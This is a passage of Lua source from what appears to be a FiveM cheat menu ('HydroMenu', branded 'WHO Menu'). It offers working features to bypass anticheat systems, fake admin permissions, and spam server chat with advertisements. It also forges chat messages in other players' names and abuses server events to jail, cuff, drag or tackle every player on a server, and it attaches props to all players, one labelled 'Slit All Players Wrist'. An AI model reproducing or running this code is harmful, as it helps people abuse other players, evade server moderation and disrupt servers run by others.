					NetworkRequestControlOfEntity(building)
					SetEntityAsMissionEntity(building, true, true)
				end
			elseif HydroMenu.CheckBox("Unlock All Vehicles", HydroVariables.MiscOptions.UnlockAllVehicles, "I locked my car WTF") then
				HydroVariables.MiscOptions.UnlockAllVehicles = not HydroVariables.MiscOptions.UnlockAllVehicles
			elseif HydroMenu.Button("Spam Server Chat") then

				if AntiCheats.WaveSheild or AntiCheats.ChocoHax or AntiCheats.BadgerAC then
					PushNotification("Anticheat Detected! Function Blocked", 600)
				else
					SpamServerChat()
				end
				
			elseif HydroMenu.CheckBox("Spam Server Chat ~r~Loop", HydroVariables.MiscOptions.SpamServerChat, "Will Freeze Servers Chat") then
				if AntiCheats.ChocoHax or AntiCheats.WaveSheild or AntiCheats.BadgerAC then
					PushNotification("Anticheat Detected! Function Blocked", 600)
				else
					HydroVariables.MiscOptions.SpamServerChat = not HydroVariables.MiscOptions.SpamServerChat
					SpamServerChatLoop()
					if not HydroVariables.MiscOptions.SpamServerChat then
						PushNotification("Spammed Servers Chat " ..tostring(mocks).. " times", 500)
						mocks = 0
					end
				end

			elseif HydroMenu.Button("Clear Chat For Self") then
				TriggerEvent("chat:clear")
			end

			HydroMenu.Display()
		elseif HydroMenu.IsMenuOpened('scriptoptions') then
		    if HydroMenu.CheckBox('Crouch Script', HydroVariables.ScriptOptions.script_crouch) then
				HydroVariables.ScriptOptions.script_crouch = not HydroVariables.ScriptOptions.script_crouch
				if HydroVariables.ScriptOptions.script_crouch then
					PushNotification("Crouch Script has Been ~g~Enabled", 600)
					CrouchScript()
				else
					PushNotification("Crouch Script has Been ~r~Disabled", 600)
					ResetPedMovementClipset(PlayerPedId(), 1.0)
				end
			elseif HydroMenu.CheckBox('Screenshot-basic Bypass', HydroVariables.ScriptOptions.SSBBypass) then
				HydroVariables.ScriptOptions.SSBBypass = not HydroVariables.ScriptOptions.SSBBypass
				ScreenshotBasicBypass()
			elseif HydroMenu.CheckBox("GGAC Bypass", HydroVariables.ScriptOptions.GGACBypass) then
				HydroVariables.ScriptOptions.GGACBypass = not HydroVariables.ScriptOptions.GGACBypass
				if HydroVariables.ScriptOptions.GGACBypass then
					GGACBypass()
                    PushNotification("GGAC Bypass has been ~g~Enabled", 1000)
                    PushNotification("Just Stop the resource :)", 1000)
				end
			elseif HydroMenu.CheckBox("Open Vaults Script", HydroVariables.ScriptOptions.vault_doors) then
				HydroVariables.ScriptOptions.vault_doors = not HydroVariables.ScriptOptions.vault_doors
				if HydroVariables.ScriptOptions.vault_doors then
					PushNotification("Open Vault Doors Script has Been ~g~Enabled", 600)
					VaultDoors()
				else
					PushNotification("Open Vault Doors Script has Been ~r~Disabled", 600)
				end
			elseif HydroMenu.CheckBox("Block Being Taken Hostage", HydroVariables.ScriptOptions.blocktakehostage) then
				HydroVariables.ScriptOptions.blocktakehostage = not HydroVariables.ScriptOptions.blocktakehostage
			elseif HydroMenu.CheckBox("Block Black Screen", HydroVariables.ScriptOptions.BlockBlackScreen) then
				HydroVariables.ScriptOptions.BlockBlackScreen = not HydroVariables.ScriptOptions.BlockBlackScreen
			elseif HydroMenu.CheckBox("Block Being Carried", HydroVariables.ScriptOptions.blockbeingcarried) then
				HydroVariables.ScriptOptions.blockbeingcarried = not HydroVariables.ScriptOptions.blockbeingcarried
			elseif HydroMenu.CheckBox("Block Peacetime", HydroVariables.ScriptOptions.BlockPeacetime) then
				HydroVariables.ScriptOptions.BlockPeacetime = not HydroVariables.ScriptOptions.BlockPeacetime
			end

			HydroMenu.Display()
		elseif HydroMenu.IsMenuOpened('hudoptions') then
			if HydroMenu.Button("Reset Hud Colour", "") then 
				ReplaceHudColourWithRgba(116, 45, 110, 185, 255)
			elseif HydroMenu.Button("Set Hud Colour Red", "") then 
				ReplaceHudColourWithRgba(116, 255, 0, 0, 255)
			elseif HydroMenu.Button("Set Hud Colour Ornage", "") then 
				ReplaceHudColourWithRgba(116, 255, 77, 0, 255)
			elseif HydroMenu.Button("Set Hud Colour Yellow", "") then 
				ReplaceHudColourWithRgba(116, 255, 255, 00, 255)
			elseif HydroMenu.Button("Set Hud Colour Green", "") then 
				ReplaceHudColourWithRgba(116, 0, 255, 102, 255)
			elseif HydroMenu.Button("Set Hud Colour Blue", "") then 
				ReplaceHudColourWithRgba(116, 0, 204, 255, 255)
			elseif HydroMenu.Button("Set Hud Colour Purple", "") then 
				ReplaceHudColourWithRgba(116, 162, 0, 255, 255)
			elseif HydroMenu.Button("Set Hud Colour Pink", "") then 
				ReplaceHudColourWithRgba(116, 255, 0, 234, 255)
			elseif HydroMenu.CheckBox("Set Hud RGB Cycle", rgbhud) then
			    rgbhud = not rgbhud
			end

			HydroMenu.Display()
		elseif HydroMenu.IsMenuOpened('weatheroptions') then
			
			if HydroMenu.Button("Extra Sunny Weather", "") then 
				ClearOverrideWeather()
				ClearWeatherTypePersist()
				SetWeatherTypeNow("EXTRASUNNY")
				SetOverrideWeather("EXTRASUNNY")
				SetWeatherTypeNowPersist("EXTRASUNNY")
				SetRainLevel(0.0)
			elseif HydroMenu.Button("Clear Weather", "") then 
				ClearOverrideWeather()
				ClearWeatherTypePersist()
				SetWeatherTypeNow("CLEAR")
				SetOverrideWeather("CLEAR")
				SetWeatherTypeNowPersist("CLEAR")
				SetRainLevel(0.0)
			elseif HydroMenu.Button("Cloudy Weather", "") then 
				ClearOverrideWeather()
				ClearWeatherTypePersist()
				SetWeatherTypeNow("CLOUDS")
				SetOverrideWeather("CLOUDS")
				SetWeatherTypeNowPersist("CLOUDS")
				SetRainLevel(0.0)
			elseif HydroMenu.Button("Overcast Weather", "") then 
				ClearOverrideWeather()
				ClearWeatherTypePersist()
				SetWeatherTypeNow("OVERCAST")
				SetOverrideWeather("OVERCAST")
				SetWeatherTypeNowPersist("OVERCAST")
				SetRainLevel(0.0)
			elseif HydroMenu.Button("Rainy Weather", "") then 
				ClearOverrideWeather()
				ClearWeatherTypePersist()
				SetWeatherTypeNow("RAIN")
				SetOverrideWeather("RAIN")
				SetWeatherTypeNowPersist("RAIN")
				SetRainLevel(10.0)
			elseif HydroMenu.Button("Clearing Weather", "") then 
				ClearOverrideWeather()
				ClearWeatherTypePersist()
				SetWeatherTypeNow("CLEARING")
				SetOverrideWeather("CLEARING")
				SetWeatherTypeNowPersist("CLEARING")
				SetRainLevel(0.0)
			elseif HydroMenu.Button("Thunder Weather", "") then 
				ClearOverrideWeather()
				ClearWeatherTypePersist()
				SetWeatherTypeNow("THUNDER")
				SetOverrideWeather("THUNDER")
				SetWeatherTypeNowPersist("THUNDER")
				SetRainLevel(0.0)
			elseif HydroMenu.Button("Smog Weather", "") then 
				ClearOverrideWeather()
				ClearWeatherTypePersist()
				SetWeatherTypeNow("SMOG")
				SetOverrideWeather("SMOG")
				SetWeatherTypeNowPersist("SMOG")
				SetRainLevel(0.0)
			elseif HydroMenu.Button("Foggy Weather", "") then 
				ClearOverrideWeather()
				ClearWeatherTypePersist()
				SetWeatherTypeNow("FOGGY")
				SetOverrideWeather("FOGGY")
				SetWeatherTypeNowPersist("FOGGY")
				SetRainLevel(0.0)
			elseif HydroMenu.Button("Christmas Weather", "") then 
				ClearOverrideWeather()
				ClearWeatherTypePersist()
				SetWeatherTypeNow("XMAS")
				SetOverrideWeather("XMAS")
				SetWeatherTypeNowPersist("XMAS")
				SetRainLevel(0.0)
			elseif HydroMenu.Button("Snowlight Weather", "") then 
				ClearOverrideWeather()
				ClearWeatherTypePersist()
				SetWeatherTypeNow("SNOWLIGHT")
				SetOverrideWeather("SNOWLIGHT")
				SetWeatherTypeNowPersist("SNOWLIGHT")
				SetRainLevel(0.0)
			elseif HydroMenu.Button("Blizzard Weather", "") then 
				ClearOverrideWeather()
				ClearWeatherTypePersist()
				SetWeatherTypeNow("BLIZZARD")
				SetOverrideWeather("BLIZZARD")
				SetWeatherTypeNowPersist("BLIZZARD")
				SetRainLevel(0.0)
			end

			HydroMenu.Display()
		elseif HydroMenu.IsMenuOpened('timeoptions') then
			if HydroMenu.Button("Set Time to 9:00", "") then 

				SetClockTime(9, 0, 0)
				NetworkOverrideClockTime(9, 0, 0)

			elseif HydroMenu.Button("Set Time to 12:00", "") then 
	
				SetClockTime(12, 0, 0)
				NetworkOverrideClockTime(12, 0, 0)

			elseif HydroMenu.Button("Set Time to 15:00", "") then 
		
				SetClockTime(15, 0, 0)
				NetworkOverrideClockTime(15, 0, 0)
	
			elseif HydroMenu.Button("Set Time to 18:00", "") then 
		
				SetClockTime(18, 0, 0)
				NetworkOverrideClockTime(18, 0, 0)
				
			elseif HydroMenu.Button("Set Time to 21:00", "") then 
		
				SetClockTime(21, 0, 0)
				NetworkOverrideClockTime(21, 0, 0)

			elseif HydroMenu.Button("Set Time to 00:00", "") then 
		
				SetClockTime(0, 0, 0)
				NetworkOverrideClockTime(0, 0, 0)

			end

			HydroMenu.Display()
		elseif HydroMenu.IsMenuOpened('miscellaneousoptions') then
			if HydroMenu.MenuButton('Anticheat Options', 'anticheatdetections', "Check what Anticheat the Server has") then
			elseif HydroMenu.MenuButton('Server Options', 'serveroptions', "Options to Destroy The Server") then
			elseif HydroMenu.MenuButton('ESP Options', 'espoptions', "ESP Options For All Players") then
			elseif HydroMenu.MenuButton("Hud Options", 'hudoptions', "Change the Color of the weapon wheel") then
			elseif HydroMenu.MenuButton("Script Options", 'scriptoptions', "Crouch Script, Bypass Vehicle Blacklist") then
			elseif HydroMenu.CheckBox("North Yankton", northyankton) then
				northyankton = not northyankton
				if northyankton then
					LoadMpDlcMaps()
					EnableMpDlcMaps(true)
					RequestIpl("FIBlobbyfake")
					RequestIpl("DT1_03_Gr_Closed")
					RequestIpl("v_tunnel_hole")
					RequestIpl("TrevorsMP")
					RequestIpl("TrevorsTrailer")
					RequestIpl("farm")
					RequestIpl("farmint")
					RequestIpl("farmint_cap")
					RequestIpl("farm_props")
					RequestIpl("CS1_02_cf_offmission")
					RequestIpl("prologue01")
					RequestIpl("prologue01c")
					RequestIpl("prologue01d")
					RequestIpl("prologue01e")
					RequestIpl("prologue01f")
					RequestIpl("prologue01g")
					RequestIpl("prologue01h")
					RequestIpl("prologue01i")
					RequestIpl("prologue01j")
					RequestIpl("prologue01k")
					RequestIpl("prologue01z")
					RequestIpl("prologue02")
					RequestIpl("prologue03")
					RequestIpl("prologue03b")
					RequestIpl("prologue04")
					RequestIpl("prologue04b")
					RequestIpl("prologue05")
					RequestIpl("prologue05b")
					RequestIpl("prologue06")
					RequestIpl("prologue06b")
					RequestIpl("prologue06_int")
					RequestIpl("prologuerd")
					RequestIpl("prologuerdb ")
					RequestIpl("prologue_DistantLights")
					RequestIpl("prologue_LODLights")
					RequestIpl("prologue_m2_door")  
				else
					LoadMpDlcMaps()
					EnableMpDlcMaps(false)
					RemoveIpl("FIBlobbyfake")
					RemoveIpl("DT1_03_Gr_Closed")
					RemoveIpl("v_tunnel_hole")
					RemoveIpl("TrevorsMP")
					RemoveIpl("TrevorsTrailer")
					RemoveIpl("farm")
					RemoveIpl("farmint")
					RemoveIpl("farmint_cap")
					RemoveIpl("farm_props")
					RemoveIpl("CS1_02_cf_offmission")
					RemoveIpl("prologue01")
					RemoveIpl("prologue01c")
					RemoveIpl("prologue01d")
					RemoveIpl("prologue01e")
					RemoveIpl("prologue01f")
					RemoveIpl("prologue01g")
					RemoveIpl("prologue01h")
					RemoveIpl("prologue01i")
					RemoveIpl("prologue01j")
					RemoveIpl("prologue01k")
					RemoveIpl("prologue01z")
					RemoveIpl("prologue02")
					RemoveIpl("prologue03")
					RemoveIpl("prologue03b")
					RemoveIpl("prologue04")
					RemoveIpl("prologue04b")
					RemoveIpl("prologue05")
					RemoveIpl("prologue05b")
					RemoveIpl("prologue06b")
					RemoveIpl("prologue06_int")
					RemoveIpl("prologuerd")
					RemoveIpl("prologuerdb ")
					RemoveIpl("prologue_DistantLights")
					RemoveIpl("prologue_LODLights")
					RemoveIpl("prologue_m2_door") 
				end
			elseif disabled and HydroMenu.Button("Execute Lua") then
				local stringToRun = HydroMenu.KeyboardEntry("Lua Executor", 200)
				ExecuteLuaCode(stringToRun)
			elseif HydroMenu.Button("Quit Game", "", "Close FiveM") then
				result = HydroMenu.KeyboardEntry("Exit Game? Type Yes/No", 200)
				if string.lower(result) == "yes" then
					RestartGame()
				end
			end

			HydroMenu.Display()
		elseif HydroMenu.IsMenuOpened('anticheatdetections') then

			if HydroMenu.CheckBox("Safe Mode", SafeMode, "~g~NEW! ~s~Avoids All Detections") then
				SafeMode = not SafeMode
			elseif HydroMenu.CheckBox("ChocoHax", AntiCheats.ChocoHax) then
				AntiCheats.ChocoHax = not AntiCheats.ChocoHax
			elseif HydroMenu.CheckBox("Wave Sheild", AntiCheats.WaveSheild) then
				AntiCheats.WaveSheild = not AntiCheats.WaveSheild
			elseif HydroMenu.CheckBox("Badger Anticheat", AntiCheats.BadgerAC) then
				AntiCheats.BadgerAC = not AntiCheats.BadgerAC
			elseif HydroMenu.CheckBox("Tigo Anticheat", AntiCheats.TigoAC) then
				AntiCheats.TigoAC = not AntiCheats.TigoAC
			elseif HydroMenu.CheckBox("VAC", AntiCheats.VAC) then
				AntiCheats.VAC = not AntiCheats.VAC
			elseif HydroMenu.Button("Disable Anticheese") then
				DisableAnticheat("anticheese")
			end

			HydroMenu.Display()
		elseif HydroMenu.IsMenuOpened('triggerevents') then
			if HydroMenu.Button("Vehicle Whitelist Bypass", "", false, "Works On Most Servers") then
			    TriggerEvent("FaxDisVeh:CheckPermission:Return", true, false)
				for i = 0, 20 do
					TriggerEvent("FaxDisVeh:CheckPermission:Return", i, false)
				end
				TriggerEvent("blacklist.setAdminPermissions", true)
			elseif HydroMenu.Button("Set Current AOP", "~g~Client") then
				local aop = HydroMenu.KeyboardEntry("Enter New AOP", 200)
				TriggerEvent("AOP:SendAOP", aop)
				TriggerEvent("yodaaop:sync_cl", aop)
				TriggerEvent("activeAOP:SyncAOPName", aop)
			elseif HydroMenu.Button("Unjail Self", "~g~Client", nil, "Works On Most Non-ESX/VRP servers") then
				TriggerEvent("SEM_InteractionMenu:UnjailPlayer")
				TriggerEvent("UnJP")
			elseif HydroMenu.Button("Un Hospitalize Self", "~g~Client", nil, "Works On Servers With SEM Interaction Menu") then
				TriggerEvent("SEM_InteractionMenu:UnhospitalizePlayer")
			elseif HydroMenu.Button("Toggle Cuffs", "~g~SEM", nil, "Works On Servers With SEM Interaction Menu") then
				TriggerEvent("SEM_InteractionMenu:Cuff")
			elseif HydroMenu.Button("Toggle Drag", "~g~SEM", nil, "Works On Servers With SEM Interaction Menu") then
				TriggerEvent(HydroMenu.DynamicTriggers.Triggers['DragSEM'])
			elseif HydroMenu.Button("Police Backup Spam", "~g~SEM", nil, "Works On Servers With SEM Interaction Menu") then
				TriggerServerEvent("SEM_InteractionMenu:Backup", math.random(1, 3), "WHO Menu On Top - discord.gg/pcCzWbFbrU\n" ..math.random(1, 1000))
			elseif HydroMenu.Button("Spam Chat", "~g~SEM") then
				local rand = 1
				for i = 1, 20 do
					colourslist = {'^1', '^2', '^3', '^4' , '^5', '^6', '^7', '^8', '^9'}
					
					local colour = colourslist[rand]
				
					if rand >= 9 then
						rand = 1
					else
						rand = rand + 1 
					end 
				
				    TriggerServerEvent("SEM_InteractionMenu:GlobalChat", {0,0,0}, colour .. "WHO MENU", colour .. "discord.gg/pcCzWbFbrU | Enjoy Monkeys")
				end
			end
			
			if HydroMenu.DynamicTriggers.Triggers['ESXHandcuff'] ~= nil and HydroMenu.Button("Toggle Cuffs", "~g~ESX", nil, "Works On Servers With ESX") then
				TriggerEvent(HydroMenu.DynamicTriggers.Triggers['ESXHandcuff'])
			elseif HydroMenu.DynamicTriggers.Triggers['ESXDrag'] ~= nil and HydroMenu.Button("Toggle Drag", "~g~ESX", nil, "Works On Servers With ESX") then
				TriggerEvent(HydroMenu.DynamicTriggers.Triggers['ESXDrag'])
			elseif HydroMenu.DynamicTriggers.Triggers['ESXVangelicoRobbery'] ~= nil and HydroMenu.Button("Vangelico Robbery", "~g~ESX", nil, "Works On Servers With ESX") then
				TriggerServerEvent(HydroMenu.DynamicTriggers.Triggers['ESXVangelicoRobbery'], 1)	
			end
			

			HydroMenu.Display()
		elseif HydroMenu.IsMenuOpened('triggereventsallplayeroptions') then
			
			if HydroMenu.Button("Carry All Players", "~y~Server") then
				local player = PlayerPedId()	
				lib = 'missfinale_c2mcs_1'
				anim1 = 'fin_c2_mcs_1_camman'
				lib2 = 'nm'
				anim2 = 'firemans_carry'
				distans = 0.15
				distans2 = 0.27
				height = 0.63
				spin = 0.0		
				length = 100000
				controlFlagMe = 49
				controlFlagTarget = 33
				animFlagTarget = 1

				ActivePlayers = GetActivePlayers()
				
				carryingBackInProgress = true

				for i = 1, #ActivePlayers do
					if HydroVariables.AllOnlinePlayers.IncludeSelf and ActivePlayers[i] ~= PlayerId() then
						TriggerServerEvent('CarryPeople:sync', GetPlayerServerId(ActivePlayers[i]), lib,lib2, anim1, anim2, distans, distans2, height,target,length,spin,controlFlagMe,controlFlagTarget,animFlagTarget)
					elseif not HydroVariables.AllOnlinePlayers.IncludeSelf then
						TriggerServerEvent('CarryPeople:sync', GetPlayerServerId(ActivePlayers[i]), lib,lib2, anim1, anim2, distans, distans2, height,target,length,spin,controlFlagMe,controlFlagTarget,animFlagTarget)
					end
				end

			elseif HydroMenu.Button("Take All Players Hostage", "~y~Server") then
				lib = 'anim@gangops@hostage@'
				anim1 = 'perp_idle'
				lib2 = 'anim@gangops@hostage@'
				anim2 = 'victim_idle'
				distans = 0.11 --Higher = closer to camera
				distans2 = -0.24 --higher = left
				height = 0.0
				spin = 0.0		
				length = 100000
				controlFlagMe = 49
				controlFlagTarget = 49
				animFlagTarget = 50
				attachFlag = true 
				PlayerList = GetActivePlayers()

				for i = 1, #PlayerList do
					if HydroVariables.AllOnlinePlayers.IncludeSelf and PlayerList[i] ~= PlayerId() then
						TriggerServerEvent('CarryPeople:sync', GetPlayerServerId(PlayerList[i]), lib,lib2, anim1, anim2, distans, distans2, height,target,length,spin,controlFlagMe,controlFlagTarget,animFlagTarget)
					elseif not HydroVariables.AllOnlinePlayers.IncludeSelf then
						TriggerServerEvent('CarryPeople:sync', GetPlayerServerId(PlayerList[i]), lib,lib2, anim1, anim2, distans, distans2, height,target,length,spin,controlFlagMe,controlFlagTarget,animFlagTarget)
					end
				end

			elseif HydroMenu.ComboBox("Task All Players to", HydroVariables.AllOnlinePlayers.DPEmotes, HydroVariables.AllOnlinePlayers.CurrentEmote, function(currentIndex, selectedIndex)
				HydroVariables.AllOnlinePlayers.CurrentEmote = currentIndex
			    end) then

					PlayerList = GetActivePlayers()
				
					for i = 1, #PlayerList do
						TriggerServerEvent("ServerValidEmote", GetPlayerServerId(PlayerList[i]), HydroVariables.AllOnlinePlayers.DPEmotes[HydroVariables.AllOnlinePlayers.CurrentEmote])	
					end

			elseif HydroMenu.DynamicTriggers.Triggers['TacklePlayer'] ~= nil and HydroMenu.Button("Tackle All Players", "~y~Server") then
				ActivePlayers = GetActivePlayers()
				
				for i = 1, #ActivePlayers do
					if HydroVariables.AllOnlinePlayers.IncludeSelf and ActivePlayers[i] ~= PlayerId() then
						TriggerServerEvent(HydroMenu.DynamicTriggers.Triggers['TacklePlayer'], GetPlayerServerId(ActivePlayers[i]))
					elseif not HydroVariables.AllOnlinePlayers.IncludeSelf then
						TriggerServerEvent(HydroMenu.DynamicTriggers.Triggers['TacklePlayer'], GetPlayerServerId(ActivePlayers[i]))
					end
				end
			elseif HydroMenu.DynamicTriggers.Triggers['JailSEM'] ~= nil and HydroMenu.Button("Jail All Players", "~y~SEM") then
				Citizen.CreateThread(function()
					PlayerList = GetActivePlayers()
					for i = 1, #PlayerList do
						Wait(10)
						if HydroVariables.AllOnlinePlayers.IncludeSelf and PlayerList[i] ~= PlayerId() then
							TriggerServerEvent(HydroMenu.DynamicTriggers.Triggers['JailSEM'], GetPlayerServerId(PlayerList[i]), math.huge)
						elseif not HydroVariables.AllOnlinePlayers.IncludeSelf then
							TriggerServerEvent(HydroMenu.DynamicTriggers.Triggers['JailSEM'], GetPlayerServerId(PlayerList[i]), math.huge)
						end
					end
			   end)
				elseif HydroMenu.Button("Drag All Players", "~y~SEM") then
					Citizen.CreateThread(function()
						PlayerList = GetActivePlayers()
						for i = 1, #PlayerList do
							Wait(10)
							if HydroVariables.AllOnlinePlayers.IncludeSelf and PlayerList[i] ~= PlayerId() then
								TriggerServerEvent(HydroMenu.DynamicTriggers.Triggers['DragSEM'], GetPlayerServerId(PlayerList[i]))
							elseif not HydroVariables.AllOnlinePlayers.IncludeSelf then
								TriggerServerEvent(HydroMenu.DynamicTriggers.Triggers['DragSEM'], GetPlayerServerId(PlayerList[i]))
							end
						end
				   end)
				elseif HydroMenu.Button("Unjail All Players", "~y~SEM") then
					Citizen.CreateThread(function()
						PlayerList = GetActivePlayers()
						for i = 1, #PlayerList do
							Wait(10)
							if HydroVariables.AllOnlinePlayers.IncludeSelf and PlayerList[i] ~= PlayerId() then
								TriggerServerEvent("SEM_InteractionMenu:Unjail", GetPlayerServerId(PlayerList[i]))
							elseif not HydroVariables.AllOnlinePlayers.IncludeSelf then
								TriggerServerEvent("SEM_InteractionMenu:Unjail", GetPlayerServerId(PlayerList[i]))
							end
						end
				   end)
				elseif HydroMenu.Button("Fake Chat Message All Players", "~y~SEM") then
					message = HydroMenu.KeyboardEntry("Enter Fake Message", 200)
					Citizen.CreateThread(function()
						PlayerList = GetActivePlayers()
						for i = 1, #PlayerList do
							Wait(10)
							TriggerServerEvent("SEM_InteractionMenu:GlobalChat", {255, 255, 255}, GetPlayerName(PlayerList[i]), message)
						end
				   end)
				   
				elseif HydroMenu.Button("Cuff All Players", "~y~SEM") then
					Citizen.CreateThread(function()
						PlayerList = GetActivePlayers()
						for i = 1, #PlayerList do
							Wait(10)
							if HydroVariables.AllOnlinePlayers.IncludeSelf and PlayerList[i] ~= PlayerId() then
								TriggerServerEvent("SEM_InteractionMenu:CuffNear", GetPlayerServerId(PlayerList[i]))
							elseif not HydroVariables.AllOnlinePlayers.IncludeSelf then
								TriggerServerEvent("SEM_InteractionMenu:CuffNear", GetPlayerServerId(PlayerList[i]))
							end
						end
				   end)
				elseif HydroMenu.Button("Send Fake Message All Players", "~y~Server") then
					if AntiCheats.ChocoHax or AntiCheats.WaveSheild or AntiCheats.BadgerAC then
						PushNotification("Anticheat Detected! Function Blocked", 600)
					else
						local result = HydroMenu.KeyboardEntry("Send Fake Chat Message All Players", 200)
						if AntiCheats.ChocoHax or AntiCheats.WaveSheild or AntiCheats.BadgerAC then
							PushNotification("Anticheat Detected! Function Blocked", 600)
						else
							local playerlist = GetActivePlayers()
						
							for i = 1, #playerlist do
								Wait(0)
								local playername = playerlist[i]
								if msg == "" then
						
								else
									TriggerServerEvent("_chat:messageEntered", GetPlayerName(playername), { 255, 255, 255 }, msg)
								end
							end
						end
				    end
				end

			HydroMenu.Display()
		elseif HydroMenu.IsMenuOpened('particleeffectsallplayeroptions') then
			if HydroMenu.CheckBox("Huge Explosion FX Spam", HydroVariables.AllOnlinePlayers.ParicleEffects.HugeExplosionSpam) then
			    HydroVariables.AllOnlinePlayers.ParicleEffects.HugeExplosionSpam = not HydroVariables.AllOnlinePlayers.ParicleEffects.HugeExplosionSpam
		    elseif HydroMenu.CheckBox("Clown Appears FX Spam", HydroVariables.AllOnlinePlayers.ParicleEffects.ClownLoop) then
			    HydroVariables.AllOnlinePlayers.ParicleEffects.ClownLoop = not HydroVariables.AllOnlinePlayers.ParicleEffects.ClownLoop
			elseif HydroMenu.CheckBox("Blood FX Spam", HydroVariables.AllOnlinePlayers.ParicleEffects.BloodLoop) then
			    HydroVariables.AllOnlinePlayers.ParicleEffects.BloodLoop = not HydroVariables.AllOnlinePlayers.ParicleEffects.BloodLoop
			elseif HydroMenu.CheckBox("Fireworks FX Spam", HydroVariables.AllOnlinePlayers.ParicleEffects.FireworksLoop) then
			    HydroVariables.AllOnlinePlayers.ParicleEffects.FireworksLoop = not HydroVariables.AllOnlinePlayers.ParicleEffects.FireworksLoop
			end

			HydroMenu.Display()
		elseif HydroMenu.IsMenuOpened('attachpropsallplayeroptions') then
			
			if HydroMenu.Button("Attach Ball to Everyone", "~y~Native") then
				RequestModel(GetHashKey('prop_juicestand'))
				local time = 0
				while not HasModelLoaded(GetHashKey('prop_juicestand')) do
					time = time + 100.0
					Citizen.Wait(100.0)
					if time > 5000 then
						print("Could not load model!")
						break
					end
			
					plist = GetActivePlayers()
					for i = 1, #plist do
						local ped = GetPlayerPed(plist[i])
						local x, y, z = table.unpack(GetEntityCoords(ped, true))
						local CreatedObject = CreateObject(GetHashKey('prop_juicestand'), x, y, z, true, true, false)
						AttachEntityToEntity(CreatedObject, ped, GetPedBoneIndex(ped, 0), 0, 0, 0, 0, 90, 0, false, false, false, false, 2, true)
					end
				end
				
			elseif HydroMenu.Button("Slit All Players Wrist", "~y~Native") then

				RequestModel(GetHashKey('prop_knife'))
				local time = 0
				while not HasModelLoaded(GetHashKey('prop_knife')) do
					time = time + 100.0
					Citizen.Wait(100.0)
					if time > 5000 then
						print("Could not load model!")
						break
					end
					
					plist = GetActivePlayers()
					for i = 1, #plist do
						local ped = GetPlayerPed(plist[i])
						local x, y, z = table.unpack(GetEntityCoords(ped, true))
						local CreatedObject = CreateObject(GetHashKey('prop_knife'), x, y, z, true, true, false)
						AttachEntityToEntity(CreatedObject, ped, GetPedBoneIndex(ped, 6286), 0, 0, 0, 0, 90, 0, false, false, false, false, 2, true)
						local CreatedObject2 = CreateObject(GetHashKey('p_bloodsplat_s'), x, y, z, true, true, false)
						AttachEntityToEntity(CreatedObject2, ped, GetPedBoneIndex(ped, 6286), 0, 0, 0, 0, 90, 0, false, false, false, false, 2, true)
					end
				end
				
			elseif HydroMenu.Button("Ramp All Players", "~y~Native") then
				AllPlayersAreARamp()
			elseif HydroMenu.Button("Dildo Server", "~y~Native", "15 Dildos on All Players") then
                DildosServer()
			elseif HydroMenu.Button("Gas All Players", "~y~Native") then
				local object = GetHashKey('prop_gas_05')
				RequestModel(object)
				local time = 0

				while not HasModelLoaded(object) do
					time = time + 100.0
					Citizen.Wait(100.0)
					if time > 5000 then
						print("Could not load model!")
						break
					end
				end
				
				plist = GetActivePlayers()
				for i = 1, #plist do
					local ped = GetPlayerPed(plist[i])
					local x, y, z = table.unpack(GetEntityCoords(ped, true))
					local CreatedObject = CreateObject(object, x, y, z, true, true, false)
					AttachEntityToEntity(CreatedObject, ped, GetPedBoneIndex(ped, 17719), 10, 0, 0, 0, 110, 90, false, false, false, false, 2, true)
				end
				
			elseif HydroMenu.Button("Attach Dog lead to Neck", "~y~Native") then
				local object = GetHashKey('prop_cs_dog_lead_2a')
				RequestModel(object)
				local time = 0

				while not HasModelLoaded(object) do
					time = time + 100.0
					Citizen.Wait(100.0)
					if time > 5000 then
						print("Could not load model!")
						break
					end
				end
				
				plist = GetActivePlayers()
				for i = 1, #plist do
					local ped = GetPlayerPed(plist[i])
					local x, y, z = table.unpack(GetEntityCoords(ped, true))
					local CreatedObject = CreateObject(object, x, y, z, true, true, false)
					AttachEntityToEntity(CreatedObject, ped, GetPedBoneIndex(ped, 47495), 0, 0, 0, 0, 90, 0, false, false, false, false, 2, true)
				end						
		
			elseif HydroMenu.Button("Dog Sign All Players", "~y~Native") then
				local object = GetHashKey('prop_beware_dog_sign')
				RequestModel(object)
				local time = 0
				while not HasModelLoaded(object) do
					time = time + 100.0
					Citizen.Wait(100.0)
					if time > 5000 then
						print("Could not load model!")
						break
					end
				end
				plist = GetActivePlayers()
				for i = 1, #plist do
					local ped = GetPlayerPed(plist[i])
					local x, y, z = table.unpack(GetEntityCoords(ped, true))
					local CreatedObject = CreateObject(object, x, y, z, true, true, false)
					AttachEntityToEntity(CreatedObject, ped, GetPedBoneIndex(ped, 17719), 10, 0, 0, 0, 110, 90, false, false, false, false, 2, true) 
				end
			elseif HydroMenu.Button("Crashed Heli", "~y~Native") then
				local object = GetHashKey('p_crahsed_heli_s')
				RequestModel(object)
				local time = 0
				while not HasModelLoaded(object) do
					time = time + 100.0
					Citizen.Wait(100.0)
					if time > 5000 then
						print("Could not load model!")
						break 
					end
				end
				plist = GetActivePlayers()
				for i = 1, #plist do
					local ped = GetPlayerPed(plist[i])
					local x, y, z = table.unpack(GetEntityCoords(ped, true))
					local CreatedObject = CreateObject(object, x, y, z, true, true, false)
					AttachEntityToEntity(CreatedObject, ped, GetPedBoneIndex(ped, 17719), 10, 0, 0, 0, 110, 90, false, false, false, false, 2, true) 
				end
			elseif HydroMenu.Button("Air Dancer All Players", "~y~Native") then
				local object = GetHashKey('p_airdancer_01_s')
				RequestModel(object)
				local time = 0
				while not HasModelLoaded(object) do
					time = time + 100.0
					Citizen.Wait(100.0)
					if time > 5000 then
						print("Could not load model!")
						break 
					end
				end
				plist = GetActivePlayers()
				for i = 1, #plist do
					local ped = GetPlayerPed(plist[i])
					local x, y, z = table.unpack(GetEntityCoords(ped, true))
					local CreatedObject = CreateObject(object, x, y, z, true, true, false)
					AttachEntityToEntity(CreatedObject, ped, GetPedBoneIndex(ped, 17719), 10, 0, 0, 0, 110, 90, false, false, false, false, 2, true) 
				end
			elseif HydroMenu.Button("Sex Doll All Players", "~y~Native") then
				local object = GetHashKey('prop_bikini_disp_03')
				RequestModel(object)
				local time = 0
				while not HasModelLoaded(object) do
					time = time + 100.0
					Citizen.Wait(100.0)
					if time > 5000 then
						print("Could not load model!")
						break 
					end
				end
				plist = GetActivePlayers()
				for i = 1, #plist do
					local ped = GetPlayerPed(plist[i])
					local x, y, z = table.unpack(GetEntityCoords(ped, true))
